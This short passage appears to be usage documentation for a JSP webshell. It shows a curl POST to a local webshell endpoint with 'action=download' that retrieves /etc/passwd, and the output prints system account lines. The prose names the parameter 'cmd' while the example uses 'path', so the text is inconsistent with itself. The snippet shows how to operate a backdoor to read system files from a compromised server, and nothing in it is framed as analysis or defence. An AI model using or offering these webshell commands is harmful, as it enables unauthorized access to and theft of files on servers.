### file download
### Downloading files

You can also download remote files by sending a GET or POST request to [http://127.0.0.1:10080/webshell/api.jsp](http://127.0.0.1:10080/webshell/api.jsp) with `action=download&cmd=/etc/passwd`:

```shell
$ curl -X POST 'http://127.0.0.1:10080/webshell/api.jsp' --data "action=download&path=/etc/passwd" -o-
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```
